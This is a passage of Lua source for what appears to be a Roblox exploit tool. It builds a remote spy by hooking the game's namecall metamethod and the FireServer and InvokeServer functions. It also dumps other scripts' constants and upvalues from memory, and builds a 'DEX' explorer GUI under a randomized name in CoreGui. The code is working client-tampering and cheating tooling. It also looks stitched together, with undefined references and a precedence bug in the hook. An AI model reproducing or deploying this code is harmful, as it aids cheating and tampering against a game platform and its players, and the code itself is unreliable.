		if remoteButton ~= currentButton then
			tweenService:Create(remoteButton, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play();
		end;
	end);
	remoteButton.MouseLeave:Connect(function()
		setthreadcontext(6);
		if remoteButton ~= currentButton then
			tweenService:Create(remoteButton, TweenInfo.new(0.1), {BackgroundTransparency = 1}):Play();
		end;
	end);
    remoteButton.MouseButton1Click:Connect(function()
        setthreadcontext(6);
		if currentButton then currentButton.BackgroundTransparency = 1; end
        currentButton = remoteButton;
        currentButton.BackgroundColor3 = Color3.fromRGB(140, 30, 49); 
		scriptsBox.Text = logs[remoteButton]["Loading Script"];
		syntaxHighlight();
		local XTBounds = scriptsBox.TextBounds.X;
		local YTBounds = scriptsBox.TextBounds.Y;
		scriptsBox.Size = UDim2.new(0, XTBounds + 2, 0, YTBounds + 2);
		local newXCanvas = XTBounds > scriptsScrollingFrame.Size.X.Offset and (XTBounds + 2.5) or 0;
		local newYCanvas = YTBounds > scriptsScrollingFrame.Size.Y.Offset and (YTBounds + 2.5) or 0;
        scriptsScrollingFrame.CanvasSize = UDim2.new(0, newXCanvas, 0, newYCanvas);
	end);
	setthreadcontext(2);
end;

local mt = getrawmetatable(game);
local oldNamecall = mt.__namecall;
local currentRemote;
setreadonly(mt, false);

mt.__namecall = newcclosure(function(obj, ...) [nonamecall]
	local method = getnamecallmethod();
    if not checkcaller() and tostring(method) == "FireServer" or tostring(method) == "InvokeServer" then
        if obj == currentRemote then
            log(obj, ...);
        end;
	end;
    
    return oldNamecall(obj, ...);
end);

setreadonly(mt, true);

local oldFireServer;
local oldInvokeServer;

oldFireServer = hookfunction(Instance.new("RemoteEvent").FireServer, function(remote, ...)
    if not checkcaller() and remote == currentRemote then
		log(remote, ...);
    end;
    
    return oldFireServer(remote, ...);
end);

oldInvokeServer = hookfunction(Instance.new("RemoteFunction").InvokeServer, function(remote, ...)
    if not checkcaller() and remote == currentRemote then
		log(remote, ...);
    end;
    
    return oldInvokeServer(remote, ...);
end);

local scriptDumper = game:GetObjects("rbxassetid://4544004447")[1];
local localScript = game:GetObjects("rbxassetid://4544003591")[1];
local moduleScript = game:GetObjects("rbxassetid://4544002916")[1];
localScript.BackgroundColor3 = Color3.fromRGB(140, 30, 49); 
localScript.AutoButtonColor = false
moduleScript.BackgroundColor3 = Color3.fromRGB(140, 30, 49); 
moduleScript.AutoButtonColor = false
local mainFrame = scriptDumper.mainFrame;
local topbarFrame = mainFrame.topbarFrame;
local exitBtn = topbarFrame.exitBtn;
local miniBtn = topbarFrame.miniBtn;
local sentinelLogo = topbarFrame.sentinelLogo;
local scriptsFrame = mainFrame.scriptsFrame;
local scriptsScrollingFrame = scriptsFrame.scriptsScrollingFrame;
local dumpsFrame = mainFrame.dumpsFrame;
local dumpsScrollingFrame = dumpsFrame.dumpsScrollingFrame;
local dumpsBox = dumpsScrollingFrame.dumpsBox;
local clearBtn = mainFrame.clearBtn;
local copyBtn = mainFrame.copyBtn;
local currentButton;
scriptDumper.Enabled = false;
scriptDumper.Parent = coregui;

do --// UI Setup
    draggable(mainFrame);

    local buttons = {
        ["copyBtn"] = function() if currentButton then setclipboard(dlogs[currentButton]["Loading Dump"]) end end,
        ["clearBtn"] = function() dlogs = {}; for i, v in pairs(scriptsScrollingFrame:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy(); end; end; remotesScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0); currentButton = nil; end,
        ["exitBtn"] = function() mainFrame:TweenSize(UDim2.new(0, 565, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25); wait(0.25); mainFrame:TweenSize(UDim2.new(0, 0, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25); wait(0.25); scriptDumper.Enabled = false; mainFrame.Size = UDim2.new(0, 565, 0, 348); end,
        ["miniBtn"] = function()
            if mainFrame.Size ~= UDim2.new(0, 565, 0, 28) then
                mainFrame:TweenSize(UDim2.new(0, 565, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true);
            else
                mainFrame:TweenSize(UDim2.new(0, 565, 0, 348), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true);
            end;
        end
    };

    for i, v in pairs(mainFrame:GetDescendants()) do
        if buttons[v.Name] then
            v.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    tweenService:Create(v, TweenInfo.new(0.1), {ImageTransparency = 0}):Play();
                end;
            end);
            v.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    tweenService:Create(v, TweenInfo.new(0.1), {ImageTransparency = 1}):Play();
                end;
            end);
            v.MouseButton1Click:Connect(buttons[v.Name]);
        end;
    end;

    scriptsScrollingFrame.ChildAdded:Connect(function(child)
        if scriptsScrollingFrame.CanvasSize.X.Offset ~= 150 then
            scriptsScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, (#scriptsScrollingFrame:GetChildren() - 1) * 24);
        else
            scriptsScrollingFrame.CanvasSize = UDim2.new(0, 150, 0, (#scriptsScrollingFrame:GetChildren() - 1) * 24);
        end;
        if child.scriptLabel.TextBounds.X > (scriptsScrollingFrame.Size.X.Offset - 20) then
            scriptsScrollingFrame.CanvasSize = UDim2.new(0, 150, 0, (#scriptsScrollingFrame:GetChildren() - 1) * 24);
        end;
    end);
end;

local function saveDData(button, script) [nonamecall]
    local function dumpScript(script)
		local str = "";

		for i, func in pairs(getgc()) do
			if type(func) == "function" and getfenv(func).script == script then
				str = str..("-"):rep(#tostring(func)).."\n\n"..tostring(func).." :\n";
				str = str.."Constants :\n";
				for idx, constant in pairs(debug.getconstants(func)) do
					str = str.."\t["..idx.."] : "..ValueToReadable(constant).."\n";
				end
				str = str.."Upvalues :\n";
				for idx, upval in pairs(debug.getupvalues(func)) do
					str = str.."\t["..idx.."] : "..ValueToReadable(upval).."\n";
				end
				str = str.."\n"..("-"):rep(#tostring(func)).."\n"
			end
		end

		return str;
	end;
    
	local data = {
		["Script"] = script,
		["Loading Dump"] = dumpScript(script)
    };
    
	dlogs[button] = data;
end;

local function log(script) [nonamecall]
	local scriptButton;
	if script:IsA("LocalScript") then
		scriptButton = localScript:Clone();
	elseif script:IsA("ModuleScript") then
		scriptButton = moduleScript:Clone();
	end;
	scriptButton.scriptLabel.Text = script.Name;
    scriptButton.Parent = scriptsScrollingFrame;
	saveDData(scriptButton, script);
	scriptButton.MouseEnter:Connect(function()
		if scriptButton ~= currentButton then
			tweenService:Create(scriptButton, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play();
		end;
	end);
	scriptButton.MouseLeave:Connect(function()
		if scriptButton ~= currentButton then
			tweenService:Create(scriptButton, TweenInfo.new(0.1), {BackgroundTransparency = 1}):Play();
		end;
	end);
    scriptButton.MouseButton1Click:Connect(function()
		currentButton = scriptButton;
		dumpsBox.Text = dlogs[scriptButton]["Loading Dump"];
		local XTBounds = dumpsBox.TextBounds.X;
		local YTBounds = dumpsBox.TextBounds.Y;
		dumpsBox.Size = UDim2.new(0, XTBounds + 2, 0, YTBounds + 2);
		local newXCanvas = XTBounds > dumpsScrollingFrame.Size.X.Offset and (XTBounds + 2.5) or 0;
		local newYCanvas = YTBounds > dumpsScrollingFrame.Size.Y.Offset and (YTBounds + 2.5) or 0;
        dumpsScrollingFrame.CanvasSize = UDim2.new(0, newXCanvas, 0, newYCanvas);
	end);
end;

CreateGui = function()
local ROBLOX = Instance.new("ScreenGui")
local PropertiesFrame = Instance.new("Frame")
local Header = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local ExplorerPanel = Instance.new("Frame")
local SideMenu = Instance.new("Frame")
local Toggle = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Version = Instance.new("TextLabel")
local Slant = Instance.new("ImageLabel")
local Main = Instance.new("Frame")
local SlideOut = Instance.new("Frame")
local SlideFrame = Instance.new("Frame")
local Explorer = Instance.new("TextButton")
local Icon = Instance.new("ImageLabel")
local SaveMap = Instance.new("TextButton")
local Icon_2 = Instance.new("ImageLabel")
local Settings = Instance.new("TextButton")
local Icon_3 = Instance.new("ImageLabel")
local Icon_4 = Instance.new("ImageLabel")
local About = Instance.new("TextButton")
local Icon_5 = Instance.new("ImageLabel")
local OpenScriptEditor = Instance.new("TextButton")
local Icon_6 = Instance.new("ImageLabel")
local Toggle_2 = Instance.new("TextButton")
local SettingsPanel = Instance.new("Frame")
local Header_2 = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local SettingTemplate = Instance.new("Frame")
local SName = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Change = Instance.new("TextButton")
local OnBar = Instance.new("TextLabel")
local Bar = Instance.new("TextLabel")
local SettingList = Instance.new("Frame")
local SaveInstance = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local MainWindow = Instance.new("Frame")
local Save = Instance.new("TextButton")
local Desc = Instance.new("TextLabel")
local Cancel = Instance.new("TextButton")
local FileName = Instance.new("TextBox")
local SaveObjects = Instance.new("TextButton")
local enabled = Instance.new("TextLabel")
local Desc2 = Instance.new("TextLabel")
local Confirmation = Instance.new("Frame")
local Title_3 = Instance.new("TextLabel")
local MainWindow_2 = Instance.new("Frame")
local Yes = Instance.new("TextButton")
local Desc_2 = Instance.new("TextLabel")
local No = Instance.new("TextButton")
local Caution = Instance.new("Frame")
local Title_4 = Instance.new("TextLabel")
local MainWindow_3 = Instance.new("Frame")
local Desc_3 = Instance.new("TextLabel")
local Ok = Instance.new("TextButton")
local CallRemote = Instance.new("Frame")
local Title_5 = Instance.new("TextLabel")
local MainWindow_4 = Instance.new("Frame")
local Desc_4 = Instance.new("TextLabel")
local Arguments = Instance.new("ScrollingFrame")
local DisplayReturned = Instance.new("TextButton")
local enabled_2 = Instance.new("TextLabel")
local Desc2_2 = Instance.new("TextLabel")
local Add = Instance.new("TextButton")
local Subtract = Instance.new("TextButton")
local ArgumentTemplate = Instance.new("Frame")
local Type = Instance.new("TextButton")
local Value = Instance.new("TextBox")
local Cancel_2 = Instance.new("TextButton")
local Ok_2 = Instance.new("TextButton")
local TableCaution = Instance.new("Frame")
local MainWindow_5 = Instance.new("Frame")
local Ok_3 = Instance.new("TextButton")
local TableResults = Instance.new("ScrollingFrame")
local TableTemplate = Instance.new("Frame")
local Type_2 = Instance.new("TextLabel")
local Value_2 = Instance.new("TextLabel")
local Title_6 = Instance.new("TextLabel")
local ScriptEditor = Instance.new("Frame")
local Title_7 = Instance.new("TextLabel")
local Cover = Instance.new("Frame")
local EditorGrid = Instance.new("Frame")
local TopBar = Instance.new("Frame")
local ScriptBarLeft = Instance.new("ImageButton")
local ArrowGraphic = Instance.new("Frame")
local Graphic = Instance.new("Frame")
local Graphic_2 = Instance.new("Frame")
local Graphic_3 = Instance.new("Frame")
local Graphic_4 = Instance.new("Frame")
local ScriptBarRight = Instance.new("ImageButton")
local ArrowGraphic_2 = Instance.new("Frame")
local Graphic_5 = Instance.new("Frame")
local Graphic_6 = Instance.new("Frame")
local Graphic_7 = Instance.new("Frame")
local Graphic_8 = Instance.new("Frame")
local Clipboard = Instance.new("TextButton")
local SaveScript = Instance.new("TextButton")
local ScriptBar = Instance.new("Frame")
local Entry = Instance.new("Frame")
local Button = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local Close_2 = Instance.new("TextButton")
local IntroFrame = Instance.new("Frame")
local Main_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local Title_8 = Instance.new("ImageLabel")
local Title_9 = Instance.new("ImageLabel")
local Version_2 = Instance.new("TextLabel")
local Creator = Instance.new("TextLabel")
local BG = Instance.new("ImageLabel")
local Slant_2 = Instance.new("Frame")
local ImageLabel_2 = Instance.new("ImageLabel")
local SaveMapWindow = Instance.new("Frame")
local Header_3 = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local MapSettings = Instance.new("Frame")
local Terrain = Instance.new("Frame")
local SName_2 = Instance.new("TextLabel")
local Status_2 = Instance.new("TextLabel")
local Change_2 = Instance.new("TextButton")
local OnBar_2 = Instance.new("TextLabel")
local Bar_2 = Instance.new("TextLabel")
local Lighting = Instance.new("Frame")
local SName_3 = Instance.new("TextLabel")
local Status_3 = Instance.new("TextLabel")
local Change_3 = Instance.new("TextButton")
local OnBar_3 = Instance.new("TextLabel")
local Bar_3 = Instance.new("TextLabel")
local CameraInstances = Instance.new("Frame")
local SName_4 = Instance.new("TextLabel")
local Status_4 = Instance.new("TextLabel")
local Change_4 = Instance.new("TextButton")
local OnBar_4 = Instance.new("TextLabel")
local Bar_4 = Instance.new("TextLabel")
local Scripts = Instance.new("Frame")
local SName_5 = Instance.new("TextLabel")
local Status_5 = Instance.new("TextLabel")
local Change_5 = Instance.new("TextButton")
local OnBar_5 = Instance.new("TextLabel")
local Bar_5 = Instance.new("TextLabel")
local ToSave = Instance.new("TextLabel")
local CopyList = Instance.new("Frame")
local Bottom = Instance.new("Frame")
local TextLabel_4 = Instance.new("TextLabel")
local Save_2 = Instance.new("TextButton")
local FileName_2 = Instance.new("TextBox")
local Entry_2 = Instance.new("Frame")
local Change_6 = Instance.new("TextButton")
local enabled_3 = Instance.new("TextLabel")
local Info = Instance.new("TextLabel")
local RemoteDebugWindow = Instance.new("Frame")
local Header_4 = Instance.new("Frame")
local TextLabel_5 = Instance.new("TextLabel")
local AboutWindow = Instance.new("Frame")
local Header_5 = Instance.new("Frame")
local TextLabel_6 = Instance.new("TextLabel")
local Desc_6 = Instance.new("TextLabel")

ROBLOX.Name = RandomCharacters(16, 64)

PropertiesFrame.Name = "PropertiesFrame"
PropertiesFrame.Parent = ROBLOX
PropertiesFrame.Active = true
PropertiesFrame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
PropertiesFrame.Transparency = 0.2
PropertiesFrame.BorderColor3 = Color3.fromRGB(191, 191, 191)
PropertiesFrame.BorderSizePixel = 0
PropertiesFrame.Position = UDim2.new(1, 0, 0.5, 36)
PropertiesFrame.Size = UDim2.new(0, 300, 0.5, -36)

Header.Name = "Header"
Header.Parent = PropertiesFrame
Header.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Header.BorderColor3 = Color3.fromRGB(149, 149, 149)
Header.BorderSizePixel = 0
Header.Position = UDim2.new(0, 0, 0, -35)
Header.Size = UDim2.new(1, 0, 0, 35)

TextLabel.Parent = Header
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0, 4, 0, 0)
TextLabel.Size = UDim2.new(1, -4, 0.5, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Properties"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextBox.Parent = Header
TextBox.BackgroundTransparency = 0.8
TextBox.Position = UDim2.new(0, 4, 0.5, 0)
TextBox.Size = UDim2.new(1, -8, 0.5, -3)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Search Properties"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14
TextBox.TextXAlignment = Enum.TextXAlignment.Left

ExplorerPanel.Name = "ExplorerPanel"
ExplorerPanel.Parent = ROBLOX
ExplorerPanel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExplorerPanel.BorderColor3 = Color3.fromRGB(191, 191, 191)
ExplorerPanel.BorderSizePixel = 0
ExplorerPanel.Position = UDim2.new(1, 0, 0, 1)
ExplorerPanel.Size = UDim2.new(0, 300, 0.5, 0)
ExplorerPanel.Transparency = 0.2

SideMenu.Name = "SideMenu"
SideMenu.Parent = ROBLOX
SideMenu.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
SideMenu.BackgroundTransparency = 1
SideMenu.BorderColor3 = Color3.fromRGB(149, 149, 149)
SideMenu.BorderSizePixel = 0
SideMenu.Position = UDim2.new(1, -330, 0, 0)
SideMenu.Size = UDim2.new(0, 30, 0, 180)
SideMenu.Visible = false
SideMenu.ZIndex = 2

Toggle.Name = "Toggle"
Toggle.Parent = SideMenu
Toggle.Active = false
Toggle.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0, 0, 0, 60)
Toggle.Size = UDim2.new(0, 30, 0, 30)
Toggle.AutoButtonColor = false
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = ">"
Toggle.TextColor3 = Color3.fromRGB(197, 28, 70)
Toggle.TextSize = 24
Toggle.TextTransparency = 1
Toggle.TextWrapped = true



Title.Name = "Title"
Title.Parent = SideMenu
Title.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 30, 0, 20)
Title.ZIndex = 2
Title.Font = Enum.Font.SourceSansBold
Title.Text = "DEX"
Title.TextColor3 = Color3.fromRGB(197, 28, 70)
Title.TextSize = 14
Title.TextWrapped = true

Version.Name = "Version"
Version.Parent = SideMenu
Version.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Version.BackgroundTransparency = 1
Version.Position = UDim2.new(0, 0, 0, 15)
Version.Size = UDim2.new(0, 30, 0, 20)
Version.ZIndex = 2
Version.Font = Enum.Font.SourceSansBold
Version.Text = "V2.0.1"
Version.TextColor3 = Color3.fromRGB(197, 28, 70)
Version.TextSize = 12
Version.TextWrapped = true

Slant.Name = "Slant"
Slant.Parent = SideMenu
Slant.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Slant.BackgroundTransparency = 1
Slant.Position = UDim2.new(0, 0, 0, 90)
Slant.Rotation = 180
Slant.Size = UDim2.new(0, 30, 0, 30)
Slant.ImageColor3 = Color3.fromRGB(43, 43, 43)
Slant.Image = "rbxassetid://474172996"

Main.Name = "Main"
Main.Parent = SideMenu
Main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Main.BorderSizePixel = 0
Main.Size = UDim2.new(0, 30, 0, 30)

SlideOut.Name = "SlideOut"
SlideOut.Parent = SideMenu
SlideOut.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SlideOut.BackgroundTransparency = 1
SlideOut.BorderSizePixel = 0
SlideOut.ClipsDescendants = true
SlideOut.Position = UDim2.new(0, 0, 0, 30)
SlideOut.Size = UDim2.new(0, 30, 0, 150)

SlideFrame.Name = "SlideFrame"
SlideFrame.Parent = SlideOut
SlideFrame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SlideFrame.BorderSizePixel = 0
SlideFrame.Position = UDim2.new(0, 0, 0, -150)
SlideFrame.Size = UDim2.new(0, 30, 0, 150)

Explorer.Name = "Explorer"
Explorer.Parent = SlideFrame
Explorer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Explorer.BackgroundTransparency = 1
Explorer.BorderSizePixel = 0
Explorer.Position = UDim2.new(0, 0, 0, 90)
Explorer.Size = UDim2.new(0, 30, 0, 30)
Explorer.ZIndex = 2
Explorer.AutoButtonColor = false
Explorer.Font = Enum.Font.SourceSans
Explorer.Text = ""
Explorer.TextSize = 24

Icon.Name = "Icon"
Icon.Parent = Explorer
Icon.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
Icon.BackgroundTransparency = 1
Icon.Position = UDim2.new(0, 5, 0, 5)
Icon.Size = UDim2.new(0, 20, 0, 20)
Icon.ZIndex = 2
Icon.Image = "rbxassetid://472635937"

SaveMap.Name = "SaveMap"
SaveMap.Parent = SlideFrame
SaveMap.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SaveMap.BackgroundTransparency = 1
SaveMap.BorderSizePixel = 0
SaveMap.Position = UDim2.new(0, 0, 0, 60)
SaveMap.Size = UDim2.new(0, 30, 0, 30)
SaveMap.ZIndex = 2
SaveMap.AutoButtonColor = false
SaveMap.Font = Enum.Font.SourceSans
SaveMap.Text = ""
SaveMap.TextSize = 24

Icon_2.Name = "Icon"
Icon_2.Parent = SaveMap
Icon_2.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
Icon_2.BackgroundTransparency = 1
Icon_2.Position = UDim2.new(0, 5, 0, 5)
Icon_2.Size = UDim2.new(0, 20, 0, 20)
Icon_2.ZIndex = 2
Icon_2.Image = "rbxassetid://472636337"

Settings.Name = "Settings"
Settings.Parent = SlideFrame
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BackgroundTransparency = 1
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0, 30)
Settings.Size = UDim2.new(0, 30, 0, 30)
Settings.ZIndex = 2
Settings.AutoButtonColor = false
Settings.Font = Enum.Font.SourceSans
Settings.Text = ""
Settings.TextSize = 24

Icon_3.Name = "Icon"
Icon_3.Parent = Settings
Icon_3.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
Icon_3.ImageColor3 = Color3.fromRGB(197, 28, 70)
Icon_3.BackgroundTransparency = 1
Icon_3.Position = UDim2.new(0, 5, 0, 5)
Icon_3.Size = UDim2.new(0, 20, 0, 20)
Icon_3.ZIndex = 2
Icon_3.Image = "rbxassetid://472635774"

About.Name = "About"
About.Parent = SlideFrame
About.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
About.BackgroundTransparency = 1
About.BorderSizePixel = 0
About.Size = UDim2.new(0, 30, 0, 30)
About.ZIndex = 2
About.AutoButtonColor = false
About.Font = Enum.Font.SourceSans
About.Text = ""
About.TextSize = 24

Icon_5.Archivable = false
Icon_5.Name = "Icon"
Icon_5.Parent = About
Icon_5.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
Icon_5.ImageColor3 = Color3.fromRGB(197, 28, 70)
Icon_5.BackgroundTransparency = 1
Icon_5.Position = UDim2.new(0, 5, 0, 5)
Icon_5.Size = UDim2.new(0, 20, 0, 20)
Icon_5.ZIndex = 2
Icon_5.Image = "rbxassetid://476354004"

OpenScriptEditor.Name = "OpenScriptEditor"
OpenScriptEditor.Parent = SideMenu
OpenScriptEditor.Active = false
OpenScriptEditor.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
OpenScriptEditor.BorderSizePixel = 0
OpenScriptEditor.Position = UDim2.new(0, 0, 0, 30)
OpenScriptEditor.Size = UDim2.new(0, 30, 0, 30)
OpenScriptEditor.ZIndex = 2
OpenScriptEditor.AutoButtonColor = false
OpenScriptEditor.Font = Enum.Font.SourceSans
OpenScriptEditor.Text = ""
OpenScriptEditor.TextSize = 24

Icon_6.Name = "Icon"
Icon_6.Parent = OpenScriptEditor
Icon_6.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
Icon_6.ImageColor3 = Color3.fromRGB(197, 28, 70)
Icon_6.BackgroundTransparency = 1
Icon_6.Position = UDim2.new(0, 5, 0, 5)
Icon_6.Size = UDim2.new(0, 20, 0, 20)
Icon_6.ZIndex = 2
Icon_6.Image = "rbxassetid://475456048"
Icon_6.ImageTransparency = 1

Toggle_2.Name = "Toggle"
Toggle_2.Parent = ROBLOX
Toggle_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Toggle_2.BorderColor3 = Color3.fromRGB(53, 53, 53)
Toggle_2.TextColor3 = Color3.fromRGB(197, 28, 70)
Toggle_2.Position = UDim2.new(1, 0, 0, 0)
Toggle_2.Size = UDim2.new(0, 30, 0, 30)
Toggle_2.Font = Enum.Font.SourceSans
Toggle_2.Text = "<"
Toggle_2.TextSize = 24

SettingsPanel.Name = "SettingsPanel"
SettingsPanel.Parent = ROBLOX
SettingsPanel.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SettingsPanel.BorderColor3 = Color3.fromRGB(191, 191, 191)
SettingsPanel.BorderSizePixel = 0
SettingsPanel.Position = UDim2.new(1, 0, 0, 1)
SettingsPanel.Size = UDim2.new(0, 300, 1, 0)

Header_2.Name = "Header"
Header_2.Parent = SettingsPanel
Header_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Header_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Header_2.Size = UDim2.new(1, 0, 0, 17)

TextLabel_2.Parent = Header_2
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(0, 4, 0, 0)
TextLabel_2.Size = UDim2.new(1, -4, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Settings"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 14
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

SettingTemplate.Name = "SettingTemplate"
SettingTemplate.Parent = SettingsPanel
SettingTemplate.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SettingTemplate.BackgroundTransparency = 1
SettingTemplate.Position = UDim2.new(0, 0, 0, 18)
SettingTemplate.Size = UDim2.new(1, 0, 0, 60)
SettingTemplate.Visible = false

SName.Name = "SName"
SName.Parent = SettingTemplate
SName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SName.BackgroundTransparency = 1
SName.Position = UDim2.new(0, 10, 0, 0)
SName.Size = UDim2.new(1, -20, 0, 30)
SName.Font = Enum.Font.SourceSans
SName.Text = "SettingName"
SName.TextColor3 = Color3.fromRGB(255, 255, 255)
SName.TextSize = 18
SName.TextXAlignment = Enum.TextXAlignment.Left

Status.Name = "Status"
Status.Parent = SettingTemplate
Status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0, 60, 0, 30)
Status.Size = UDim2.new(0, 50, 0, 15)
Status.Font = Enum.Font.SourceSans
Status.Text = "Off"
Status.TextColor3 = Color3.fromRGB(255, 255, 255)
Status.TextSize = 18
Status.TextXAlignment = Enum.TextXAlignment.Left

Change.Name = "Change"
Change.Parent = SettingTemplate
Change.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Change.BorderSizePixel = 0
Change.Position = UDim2.new(0, 10, 0, 30)
Change.Size = UDim2.new(0, 40, 0, 15)
Change.Font = Enum.Font.SourceSans
Change.Text = ""
Change.TextColor3 = Color3.fromRGB(255, 255, 255)
Change.TextSize = 14

OnBar.Name = "OnBar"
OnBar.Parent = Change
OnBar.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
OnBar.BorderSizePixel = 0
OnBar.Size = UDim2.new(0, 0, 0, 15)
OnBar.Font = Enum.Font.SourceSans
OnBar.Text = ""
OnBar.TextColor3 = Color3.fromRGB(255, 255, 255)
OnBar.TextSize = 14

Bar.Name = "Bar"
Bar.Parent = Change
Bar.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Bar.BorderSizePixel = 0
Bar.ClipsDescendants = true
Bar.Position = UDim2.new(0, -2, 0, -2)
Bar.Size = UDim2.new(0, 10, 0, 19)
Bar.Font = Enum.Font.SourceSans
Bar.Text = ""
Bar.TextColor3 = Color3.fromRGB(255, 255, 255)
Bar.TextSize = 14

SettingList.Name = "SettingList"
SettingList.Parent = SettingsPanel
SettingList.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SettingList.BackgroundTransparency = 1
SettingList.Position = UDim2.new(0, 0, 0, 17)
SettingList.Size = UDim2.new(1, 0, 1, -17)

SaveInstance.Name = "SaveInstance"
SaveInstance.Parent = ROBLOX
SaveInstance.Active = true
SaveInstance.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SaveInstance.BorderColor3 = Color3.fromRGB(30, 30, 30)
dragger.new(SaveInstance)
SaveInstance.Position = UDim2.new(0.3, 0, 0.3, 0)
SaveInstance.Size = UDim2.new(0, 350, 0, 20)
SaveInstance.Visible = false
SaveInstance.ZIndex = 2

Title_2.Name = "Title"
Title_2.Parent = SaveInstance
Title_2.BackgroundTransparency = 1
Title_2.Size = UDim2.new(1, 0, 1, 0)
Title_2.ZIndex = 2
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "Save Instance"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 14
Title_2.TextXAlignment = Enum.TextXAlignment.Left

MainWindow.Name = "MainWindow"
MainWindow.Parent = SaveInstance
MainWindow.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
MainWindow.BackgroundTransparency = 0.1
MainWindow.BorderColor3 = Color3.fromRGB(30, 30, 30)
MainWindow.Size = UDim2.new(1, 0, 0, 200)

Save.Name = "Save"
Save.Parent = MainWindow
Save.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Save.BackgroundTransparency = 0.5
Save.BorderColor3 = Color3.fromRGB(40, 40, 40)
Save.Position = UDim2.new(0.075, 0, 1, -40)
Save.Size = UDim2.new(0.4, 0, 0, 30)
Save.Font = Enum.Font.SourceSans
Save.Text = "Save"
Save.TextColor3 = Color3.fromRGB(255, 255, 255)
Save.TextSize = 18

Desc.Name = "Desc"
Desc.Parent = MainWindow
Desc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc.BackgroundTransparency = 1
Desc.Position = UDim2.new(0, 0, 0, 20)
Desc.Size = UDim2.new(1, 0, 0, 40)
Desc.Font = Enum.Font.SourceSans
Desc.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.TextSize = 14
Desc.TextWrapped = true

Cancel.Name = "Cancel"
Cancel.Parent = MainWindow
Cancel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Cancel.BackgroundTransparency = 0.5
Cancel.BorderColor3 = Color3.fromRGB(40, 40, 40)
Cancel.Position = UDim2.new(0.524, 0, 1, -40)
Cancel.Size = UDim2.new(0.4, 0, 0, 30)
Cancel.Font = Enum.Font.SourceSans
Cancel.Text = "Cancel"
Cancel.TextColor3 = Color3.fromRGB(255, 255, 255)
Cancel.TextSize = 18

